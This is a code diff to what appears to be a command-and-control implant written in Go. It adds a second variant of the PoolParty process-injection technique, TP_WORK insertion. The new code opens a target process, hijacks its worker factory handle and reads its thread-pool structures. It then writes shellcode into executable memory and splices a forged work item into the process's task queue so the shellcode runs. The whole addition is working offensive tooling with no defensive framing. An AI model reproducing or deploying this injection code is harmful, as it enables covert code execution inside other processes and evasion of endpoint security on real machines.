@@ -6,6 +6,7 @@
 // This command implements PoolParty injection techniques based on SafeBreach Labs research.
 // Currently supported variants:
 //   - Variant 1: Worker Factory Start Routine Overwrite
+//   - Variant 2: TP_WORK Insertion
 //   - Variant 7: TP_DIRECT Insertion (via I/O Completion Port)
 //
 // These techniques abuse Windows Thread Pool internals to achieve code execution
@@ -53,7 +54,12 @@ const (
 	// Object info class
 	ObjectTypeInformation = 2
 
-	// Memory protection
+	// Thread pool callback priorities
+	TP_CALLBACK_PRIORITY_HIGH   = 0
+	TP_CALLBACK_PRIORITY_NORMAL = 1
+	TP_CALLBACK_PRIORITY_LOW    = 2
+
+	// Memory protection (PAGE_READWRITE is in vanillainjection.go)
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
@@ -111,9 +117,21 @@ type PUBLIC_OBJECT_TYPE_INFORMATION struct {
 	Reserved [22]uint32
 }
 
+// LIST_ENTRY structure
+type LIST_ENTRY struct {
+	Flink uintptr
+	Blink uintptr
+}
+
+// TP_TASK_CALLBACKS structure
+type TP_TASK_CALLBACKS struct {
+	ExecuteCallback uintptr
+	Unposted        uintptr
+}
+
 // TP_TASK structure
 type TP_TASK struct {
-	Callbacks      uintptr
+	Callbacks      uintptr // Pointer to TP_TASK_CALLBACKS
 	NumaNode       uint32
 	IdealProcessor uint8
 	_              [3]byte
@@ -131,21 +149,71 @@ type TP_DIRECT struct {
 	_                           [3]byte
 }
 
-// LIST_ENTRY structure
-type LIST_ENTRY struct {
-	Flink uintptr
-	Blink uintptr
+// TPP_WORK_STATE union (represented as uint32)
+type TPP_WORK_STATE struct {
+	Exchange uint32
+}
+
+// Simplified TPP_CLEANUP_GROUP_MEMBER - only the fields we need
+type TPP_CLEANUP_GROUP_MEMBER struct {
+	_                  [8]byte   // Refcount
+	_                  [8]byte   // padding
+	VFuncs             uintptr   // VFuncs pointer
+	CleanupGroup       uintptr   // CleanupGroup pointer
+	CleanupGroupCancel uintptr   // CleanupGroupCancelCallback
+	Finalization       uintptr   // FinalizationCallback
+	CleanupGroupLinks  LIST_ENTRY // CleanupGroupMemberLinks
+	_                  [64]byte  // CallbackBarrier
+	Callback           uintptr   // Union of various callbacks
+	Context            uintptr
+	ActivationContext  uintptr
+	SubProcessTag      uintptr
+	ActivityId         [16]byte  // GUID
+	WorkOnBehalfTicket [8]byte   // ALPC ticket
+	RaceDll            uintptr
+	Pool               uintptr   // Pointer to FULL_TP_POOL
+	PoolObjectLinks    LIST_ENTRY
+	Flags              uint32    // Union flags/longfunction/etc
+	_                  [4]byte   // padding
+	_                  [16]byte  // AllocCaller
+	_                  [16]byte  // ReleaseCaller
+	CallbackPriority   int32
+	_                  [4]byte   // padding
+}
+
+// FULL_TP_WORK structure
+type FULL_TP_WORK struct {
+	CleanupGroupMember TPP_CLEANUP_GROUP_MEMBER
+	Task               TP_TASK
+	WorkState          TPP_WORK_STATE
+	_                  [4]byte // padding
+}
+
+// TPP_QUEUE structure (simplified)
+type TPP_QUEUE struct {
+	Queue LIST_ENTRY
+	_     [40]byte // RTL_SRWLOCK and other fields
+}
+
+// FULL_TP_POOL structure (simplified - only fields we need)
+type FULL_TP_POOL struct {
+	_         [16]byte     // Refcount and padding
+	_         [8]byte      // QueueState
+	TaskQueue [3]uintptr   // Array of pointers to TPP_QUEUE
+	_         [1024]byte   // Rest of the structure (we don't need these fields)
 }
 
 // NT API procedures
 var (
-	ntdll                             = windows.NewLazySystemDLL("ntdll.dll")
-	procNtQueryInformationWorkerFactory = ntdll.NewProc("NtQueryInformationWorkerFactory")
-	procNtSetInformationWorkerFactory   = ntdll.NewProc("NtSetInformationWorkerFactory")
-	procNtQueryInformationProcess       = ntdll.NewProc("NtQueryInformationProcess")
-	procNtQueryObject                   = ntdll.NewProc("NtQueryObject")
-	procZwSetIoCompletion               = ntdll.NewProc("ZwSetIoCompletion")
-	procRtlNtStatusToDosError           = ntdll.NewProc("RtlNtStatusToDosError")
+	ntdll                                 = windows.NewLazySystemDLL("ntdll.dll")
+	procNtQueryInformationWorkerFactory   = ntdll.NewProc("NtQueryInformationWorkerFactory")
+	procNtSetInformationWorkerFactory     = ntdll.NewProc("NtSetInformationWorkerFactory")
+	procNtQueryInformationProcess         = ntdll.NewProc("NtQueryInformationProcess")
+	procNtQueryObject                     = ntdll.NewProc("NtQueryObject")
+	procZwSetIoCompletion                 = ntdll.NewProc("ZwSetIoCompletion")
+	procRtlNtStatusToDosError             = ntdll.NewProc("RtlNtStatusToDosError")
+	procReadProcessMemory                 = kernel32.NewProc("ReadProcessMemory")
+	procCreateThreadpoolWork              = kernel32.NewProc("CreateThreadpoolWork")
 )
 
 // PoolPartyInjectionCommand implements the poolparty-injection command
@@ -225,6 +293,8 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	switch params.Variant {
 	case 1:
 		output, err = executeVariant1(shellcode, uint32(params.PID))
+	case 2:
+		output, err = executeVariant2(shellcode, uint32(params.PID))
 	case 7:
 		output, err = executeVariant7(shellcode, uint32(params.PID))
 	default:
@@ -320,6 +390,184 @@ func executeVariant1(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Set worker factory thread minimum to: %d\n", newMinimum)
 	output += "[+] PoolParty Variant 1 injection completed successfully\n"
+
+	return output, nil
+}
+
+// executeVariant2 implements TP_WORK Insertion
+func executeVariant2(shellcode []byte, pid uint32) (string, error) {
+	var output string
+	output += "[*] PoolParty Variant 2: TP_WORK Insertion\n"
+	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
+	output += fmt.Sprintf("[*] Target PID: %d\n", pid)
+
+	// Step 1: Open target process
+	hProcess, err := windows.OpenProcess(
+		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
+			PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION,
+		false,
+		pid,
+	)
+	if err != nil {
+		return output, fmt.Errorf("OpenProcess failed: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)
+
+	// Step 2: Hijack TpWorkerFactory handle
+	hWorkerFactory, err := hijackProcessHandle(hProcess, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)
+	if err != nil {
+		return output, fmt.Errorf("failed to hijack worker factory handle: %v", err)
+	}
+	defer windows.CloseHandle(hWorkerFactory)
+	output += fmt.Sprintf("[+] Hijacked worker factory handle: 0x%X\n", hWorkerFactory)
+
+	// Step 3: Query worker factory information
+	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
+	status, _, _ := procNtQueryInformationWorkerFactory.Call(
+		uintptr(hWorkerFactory),
+		uintptr(WorkerFactoryBasicInformation),
+		uintptr(unsafe.Pointer(&workerFactoryInfo)),
+		uintptr(unsafe.Sizeof(workerFactoryInfo)),
+		0,
+	)
+	if status != 0 {
+		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
+	}
+	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)
+
+	// Step 4: Read target process's TP_POOL structure
+	var targetTpPool FULL_TP_POOL
+	var bytesRead uintptr
+	ret, _, err := procReadProcessMemory.Call(
+		uintptr(hProcess),
+		workerFactoryInfo.StartParameter,
+		uintptr(unsafe.Pointer(&targetTpPool)),
+		uintptr(unsafe.Sizeof(targetTpPool)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("ReadProcessMemory for TP_POOL failed: %v", err)
+	}
+	output += "[+] Read target process's TP_POOL structure\n"
+
+	// Step 5: Get high priority task queue address
+	if targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH] == 0 {
+		return output, fmt.Errorf("high priority task queue is NULL")
+	}
+
+	// Read the TPP_QUEUE structure to get the queue LIST_ENTRY
+	var targetQueue TPP_QUEUE
+	ret, _, err = procReadProcessMemory.Call(
+		uintptr(hProcess),
+		targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH],
+		uintptr(unsafe.Pointer(&targetQueue)),
+		uintptr(unsafe.Sizeof(targetQueue)),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("ReadProcessMemory for TPP_QUEUE failed: %v", err)
+	}
+	output += "[+] Read target process's task queue structure\n"
+
+	// Step 6: Allocate memory for shellcode in target process
+	shellcodeAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(len(shellcode)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_EXECUTE_READWRITE),
+	)
+	if shellcodeAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)
+
+	// Step 7: Write shellcode
+	var bytesWritten uintptr
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		shellcodeAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)
+
+	// Step 8: Create TP_WORK structure via CreateThreadpoolWork
+	pTpWork, _, err := procCreateThreadpoolWork.Call(
+		shellcodeAddr, // Work callback points to shellcode
+		0,             // Context
+		0,             // Callback environment
+	)
+	if pTpWork == 0 {
+		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
+	}
+	output += "[+] Created TP_WORK structure associated with shellcode\n"
+
+	// Step 9: Read and modify the TP_WORK structure
+	var tpWork FULL_TP_WORK
+	// Copy the structure from our local process
+	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
+		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
+			*(*byte)(unsafe.Pointer(pTpWork + uintptr(i)))
+	}
+
+	// Modify the structure to link it into target's task queue
+	tpWork.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
+	targetTaskQueueAddr := targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
+	tpWork.Task.ListEntry.Flink = targetTaskQueueAddr
+	tpWork.Task.ListEntry.Blink = targetTaskQueueAddr
+	tpWork.WorkState.Exchange = 0x2 // Mark as insertable with pending callback
+	output += "[+] Modified TP_WORK structure for insertion\n"
+
+	// Step 10: Allocate memory for TP_WORK in target process
+	tpWorkAddr, _, err := procVirtualAllocEx.Call(
+		uintptr(hProcess),
+		0,
+		uintptr(unsafe.Sizeof(tpWork)),
+		uintptr(MEM_COMMIT|MEM_RESERVE),
+		uintptr(PAGE_READWRITE),
+	)
+	if tpWorkAddr == 0 {
+		return output, fmt.Errorf("VirtualAllocEx for TP_WORK failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)
+
+	// Step 11: Write TP_WORK to target
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		tpWorkAddr,
+		uintptr(unsafe.Pointer(&tpWork)),
+		uintptr(unsafe.Sizeof(tpWork)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for TP_WORK failed: %v", err)
+	}
+	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)
+
+	// Step 12: Insert the work item into the task queue by updating the queue's LIST_ENTRY
+	// We need to update the Flink of the queue to point to our TP_WORK's Task.ListEntry
+	newListEntry := LIST_ENTRY{
+		Flink: tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry)),
+		Blink: targetQueue.Queue.Blink,
+	}
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		targetTaskQueueAddr,
+		uintptr(unsafe.Pointer(&newListEntry)),
+		uintptr(unsafe.Sizeof(newListEntry)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for queue insertion failed: %v", err)
+	}
+	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
+	output += "[+] PoolParty Variant 2 injection completed successfully\n"
 
 	return output, nil
 }
